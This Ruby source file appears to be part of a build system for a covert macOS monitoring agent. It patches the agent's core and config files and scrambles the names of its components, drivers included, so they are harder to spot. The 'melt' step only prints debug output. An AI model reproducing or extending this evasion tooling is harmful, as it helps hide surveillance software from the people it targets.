#
#  Agent creation for osx
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildOSX < Build

  def initialize
    super
    @platform = 'osx'
  end

  def patch(params)
    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = 'core'
    params[:config] = 'config'

    # invoke the generic patch method with the new params
    super

  end

  def scramble
    trace :debug, "Build: scrambling"

    core = scramble_name(@factory.seed, 3)
    core_backup = scramble_name(core, 32)
    dir = scramble_name(core[0..7], 7) + '.app'
    config = scramble_name(core[0] < core_backup[0] ? core : core_backup, 1)
    inputmanager = scramble_name(config, 2)
    driver = scramble_name(config, 4)
    driver64 = scramble_name(config, 16)
    icon = "q45tyh"
        
    @scrambled = {core: core, dir: dir, config: config, inputmanager: inputmanager,
                  icon: icon, driver: driver, driver64: driver64}

    # call the super which will actually do the renaming
    # starting from @outputs and @scrambled
    super
    
  end

  def melt(params)
    trace :debug, "Build: melting: #{params}"

    puts CrossPlatform.platform
    puts @outputs.inspect
    puts @scrambled.inspect
  end

end

end #DB::
end #RCS::
